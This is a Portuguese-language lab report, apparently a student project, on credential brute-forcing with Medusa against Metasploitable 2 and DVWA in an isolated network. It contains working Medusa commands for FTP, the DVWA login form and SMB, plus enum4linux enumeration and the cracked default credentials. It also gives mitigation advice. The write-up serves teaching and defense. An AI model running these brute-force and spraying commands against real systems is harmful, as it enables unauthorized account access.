# Projeto de Auditoria de Segurança com Medusa

## 1. Introdução

Este projeto foi desenvolvido como parte de um laboratório prático de
cibersegurança, utilizando o **Kali Linux**, o **Metasploitable 2**, o
**DVWA (Damn Vulnerable Web Application)** e a ferramenta **Medusa**.

O objetivo foi realizar testes controlados de autenticação em um
ambiente virtualizado e isolado, simulando cenários de força bruta e
password spraying. Os testes tiveram finalidade exclusivamente
educacional e foram realizados contra máquinas disponibilizadas para o
laboratório.

Os principais cenários abordados foram:

-   Força bruta contra serviço FTP;
-   Tentativas automatizadas de autenticação no DVWA;
-   Enumeração de usuários e testes de autenticação no SMB;
-   Password spraying em ambiente SMB;
-   Validação manual dos resultados;
-   Análise de riscos e medidas de mitigação.

------------------------------------------------------------------------

## 2. Ambiente do Laboratório

  Item                          Informação
  ----------------------------- ------------------
  Sistema de testes             Kali Linux
  Máquina vulnerável            Metasploitable 2
  Aplicação web vulnerável      DVWA
  Virtualização                 VirtualBox
  Rede                          Host-Only
  IP utilizado no laboratório   `192.168.56.102`
  Ferramenta principal          Medusa 2.3

Todos os testes foram realizados dentro do ambiente virtualizado do
laboratório.

------------------------------------------------------------------------

# 3. Teste de Força Bruta no FTP

## 3.1 Objetivo

O primeiro cenário consistiu em testar a resistência do serviço FTP do
Metasploitable 2 contra tentativas automatizadas de autenticação
utilizando uma lista simples de usuários e senhas.

## 3.2 Criação das wordlists

Foi criada uma lista de usuários:

``` bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

Lista de senhas:

``` bash
echo -e "123456\npasswordznqwerty\nmsfadmin\n654321" > pass.txt
```

Para verificar as listas:

``` bash
cat users.txt
cat pass.txt
```

## 3.3 Execução do Medusa

Foi utilizado o módulo FTP:

``` bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M ftp -t 6
```

### Parâmetros utilizados

  Parâmetro   Função
  ----------- ----------------------------------------
  `-h`        Define o endereço IP do alvo
  `-U`        Define a lista de usuários
  `-P`        Define a lista de senhas
  `-M ftp`    Utiliza o módulo FTP
  `-t 6`      Define o número de tarefas simultâneas

O resultado apresentado pelo Medusa foi utilizado para identificar uma
combinação de credenciais válida.

## 3.4 Validação

Após a identificação das credenciais, foi realizada uma validação manual
utilizando o cliente FTP:

``` bash
ftp 192.168.56.102
```

A validação manual foi utilizada para confirmar que o resultado
apresentado pela ferramenta correspondia a uma autenticação realmente
aceita pelo serviço.

## 3.5 Análise

O teste demonstrou como senhas fracas ou previsíveis podem permitir
acesso a serviços de rede quando não existem mecanismos adequados de
proteção contra tentativas automatizadas.

------------------------------------------------------------------------

# 4. Teste de Força Bruta no DVWA

## 4.1 Objetivo

O segundo cenário consistiu na realização de um teste controlado contra
o formulário de autenticação do DVWA.

Página utilizada:

``` text
http://192.168.56.102/dvwa/login.php
```

## 4.2 Identificação do formulário

Durante a análise da página de login foram identificados os principais
campos:

-   `username`
-   `password`
-   `Login`

O formulário utiliza o método:

``` text
POST
```

Também foi identificado que uma tentativa inválida apresenta a mensagem:

``` text
Login failed
```

## 4.3 Primeira tentativa com o módulo HTTP

Inicialmente foi utilizado o módulo HTTP:

``` bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' \
-t 6
```

Entretanto, a versão do Medusa instalada no laboratório não apresentou
as opções esperadas para esse módulo.

As opções disponíveis foram verificadas com:

``` bash
medusa -M http -q
```

## 4.4 Utilização do módulo web-form

Foi então analisado o módulo de formulário web:

``` bash
medusa -M web-form -q
```

Entre as opções apresentadas estavam:

-   `FORM`
-   `FORM-DATA`
-   `DENY-SIGNAL`
-   `CUSTOM-HEADER`
-   `USER-AGENT`

A configuração foi adaptada para o módulo disponível.

``` bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M web-form \
-m FORM:"/dvwa/login.php" \
-m FORM-DATA:"post?username=&password=&Login=login" \
-m DENY-SIGNAL:"Login failed" \
-t 6
```

## 4.5 Problema com HTTP 302

Durante os testes foi identificado o código HTTP:

``` text
302
```

O código 302 representa um redirecionamento HTTP.

A análise demonstrou que o comportamento do DVWA após a autenticação
precisava ser considerado na interpretação do resultado do Medusa.

Também foi observado que a presença de informações como `admin` e
`password` na página não deveria ser utilizada isoladamente como
indicador de sucesso, pois o próprio DVWA apresenta uma dica contendo
essas informações.

## 4.6 Validação da autenticação

Após os ajustes, o Medusa identificou uma combinação válida:

``` text
Usuário: admin
Senha: password
```

A credencial foi posteriormente validada manualmente pelo navegador.

Após o login, a aplicação apresentou informações da área autenticada,
incluindo:

``` text
Username: admin
Security Level: high
PHPIDS: disabled
```

Dessa forma, o resultado apresentado pelo Medusa foi confirmado pelo
próprio sistema.

## 4.7 Análise

O cenário demonstrou a importância de analisar o comportamento da
aplicação e não considerar automaticamente uma mensagem de sucesso da
ferramenta como prova definitiva de uma credencial válida.

A validação manual foi fundamental para confirmar o resultado.

------------------------------------------------------------------------

# 5. Enumeração de Usuários e Testes SMB

## 5.1 Objetivo

O terceiro cenário foi realizado contra o serviço SMB do Metasploitable
2.

O objetivo foi:

1.  Enumerar usuários;
2.  Criar uma lista de usuários para teste;
3.  Utilizar senhas comuns;
4.  Identificar possíveis credenciais válidas;
5.  Validar o acesso ao serviço SMB.

## 5.2 Enumeração

Foi utilizada a ferramenta `enum4linux` contra o alvo:

``` bash
enum4linux -a 192.168.56.102 | tee enum4_output.txt
```

A enumeração retornou informações sobre usuários e serviços do ambiente.

Entre os usuários identificados estavam, por exemplo:

``` text
msfadmin
service
```

Também foram observadas diversas contas de sistema durante a enumeração.

## 5.3 Criação da lista de usuários

Para o teste SMB foi criada uma lista reduzida:

``` bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
```

## 5.4 Criação da lista de senhas

Foi criada uma lista contendo senhas comuns:

``` bash
echo -e "password\n123456\nwelcome123\nmsfadmin" > senhas_spray.txt
```

## 5.5 Teste automatizado com Medusa

Foi utilizado o módulo SMBNT:

``` bash
medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

### Parâmetros

  -----------------------------------------------------------------------
  Parâmetro                           Função
  ----------------------------------- -----------------------------------
  `-h`                                Define o endereço do alvo

  `-U`                                Define a lista de usuários

  `-P`                                Define a lista de senhas

  `-M smbnt`                          Utiliza o módulo SMBNT

  `-t 2`                              Define tarefas simultâneas

  `-T 50`                             Define o número máximo de
                                      tentativas/conexões conforme o
                                      módulo
  -----------------------------------------------------------------------

Durante o teste foi identificada uma autenticação aceita:

``` text
User: msfadmin
Password: msfadmin
SUCCESS
```

## 5.6 Validação do acesso SMB

Após o resultado do Medusa, a autenticação foi validada utilizando:

``` bash
smbclient -L //192.168.56.102 -U msfadmin
```

O servidor retornou informações sobre os compartilhamentos disponíveis,
incluindo:

``` text
ADMIN$
msfadmin
IPC$
print$
tmp
opt
```

A resposta confirmou que a autenticação com a conta `msfadmin` foi
aceita pelo serviço SMB.

------------------------------------------------------------------------

## 5.7 Password Spraying

O conceito de password spraying consiste em utilizar uma mesma senha
contra diversos usuários, em vez de testar diversas senhas contra uma
única conta.

Para representar esse cenário de forma específica no laboratório, pode
ser executado:

``` bash
medusa -h 192.168.56.102 -U smb_users.txt -p msfadmin -M smbnt -t 2
```

Nesse caso, a senha `msfadmin` é testada contra os usuários presentes em
`smb_users.txt`.

> **Observação:** o teste anterior com `-P senhas_spray.txt` realizou
> tentativa de múltiplas senhas contra os usuários. Para caracterizar
> especificamente password spraying, deve ser registrada também a
> execução com uma única senha (`-p`) contra múltiplos usuários.

------------------------------------------------------------------------

# 6. Resultados Obtidos

  -----------------------------------------------------------------------
  Serviço                 Técnica                 Resultado
  ----------------------- ----------------------- -----------------------
  FTP                     Força bruta             Credencial válida
                                                  identificada e validada

  DVWA                    Força bruta web         `admin:password`
                                                  identificado e validado

  SMB                     Enumeração              Usuários e
                                                  compartilhamentos
                                                  identificados

  SMB                     Tentativas              `msfadmin:msfadmin`
                          automatizadas           identificado e validado

  SMB                     Password spraying       Executar/registrar
                                                  teste com uma única
                                                  senha contra múltiplos
                                                  usuários
  -----------------------------------------------------------------------

Os resultados demonstram que o uso de credenciais fracas e previsíveis
representa um risco significativo em serviços de rede e aplicações web.

------------------------------------------------------------------------

# 7. Medidas de Mitigação

## 7.1 Proteção contra força bruta

Recomenda-se:

-   Utilizar senhas fortes e únicas;
-   Implementar limitação de tentativas de autenticação;
-   Aplicar bloqueio temporário após várias tentativas malsucedidas;
-   Utilizar autenticação multifator (MFA);
-   Monitorar eventos de autenticação;
-   Implementar mecanismos de detecção de tentativas automatizadas;
-   Registrar e analisar logs de acesso.

## 7.2 Proteção do SMB

Para reduzir os riscos relacionados ao SMB:

-   Evitar senhas padrão ou previsíveis;
-   Desabilitar contas desnecessárias;
-   Aplicar políticas de senha fortes;
-   Restringir o acesso ao SMB por firewall;
-   Utilizar versões seguras do protocolo;
-   Evitar exposição do SMB a redes não confiáveis;
-   Monitorar tentativas de autenticação;
-   Aplicar o princípio do menor privilégio.

## 7.3 Proteção de aplicações web

Para aplicações como o DVWA, recomenda-se:

-   Limitar tentativas de login;
-   Utilizar CAPTCHA após múltiplas falhas;
-   Implementar MFA;
-   Utilizar mensagens de erro que não revelem informações
    desnecessárias;
-   Registrar tentativas de autenticação;
-   Monitorar padrões anormais de login;
-   Utilizar senhas fortes.

------------------------------------------------------------------------

# 8. Evidências

As evidências do laboratório devem ser organizadas na pasta `/images`.

Sugestão de organização:

``` text
/images/
├── 01-ftp-medusa.png
├── 02-ftp-validacao.png
├── 03-dvwa-formulario.png
├── 04-dvwa-medusa.png
├── 05-dvwa-validacao.png
├── 06-smb-enumeracao.png
├── 07-smb-medusa.png
├── 08-smb-validacao.png
└── 09-smb-password-spraying.png
```

Os nomes acima são apenas uma sugestão de organização. Devem ser
substituídos pelos nomes reais dos arquivos utilizados no repositório.

------------------------------------------------------------------------

# 9. Considerações sobre o laboratório

Todos os testes foram realizados em ambiente virtualizado e controlado,
utilizando máquinas disponibilizadas especificamente para fins
educacionais.

Nenhum dos testes foi direcionado a sistemas de terceiros ou ambientes
sem autorização.

O objetivo do laboratório foi compreender o funcionamento de ferramentas
de auditoria, interpretar respostas de serviços e identificar medidas
que podem reduzir o risco de ataques de autenticação automatizados.

------------------------------------------------------------------------

# 10. Conclusão

O laboratório permitiu aplicar conceitos de segurança ofensiva de
maneira controlada, utilizando o Kali Linux e a ferramenta Medusa contra
serviços vulneráveis disponibilizados no Metasploitable 2 e no DVWA.

Durante os testes foram explorados diferentes cenários de autenticação,
incluindo FTP, aplicações web e SMB.

No cenário web, foi necessário analisar o formulário do DVWA,
identificar o método HTTP utilizado, compreender os parâmetros enviados
e interpretar corretamente o código HTTP 302. A validação manual
demonstrou a importância de confirmar os resultados apresentados por
ferramentas automatizadas.

No cenário SMB, a enumeração permitiu identificar usuários e informações
sobre os compartilhamentos disponíveis. O teste automatizado identificou
a combinação `msfadmin:msfadmin`, posteriormente validada com o cliente
SMB.

O exercício demonstrou, na prática, os riscos associados ao uso de
senhas fracas, previsíveis ou reutilizadas, além da importância de
mecanismos de proteção contra tentativas automatizadas de autenticação.

Como medidas preventivas, destacam-se o uso de senhas fortes, MFA,
limitação de tentativas, monitoramento de logs, políticas de bloqueio e
restrição de serviços de rede.

O laboratório também reforçou que ferramentas como o Medusa devem ser
utilizadas de forma responsável e somente em ambientes autorizados para
testes de segurança.
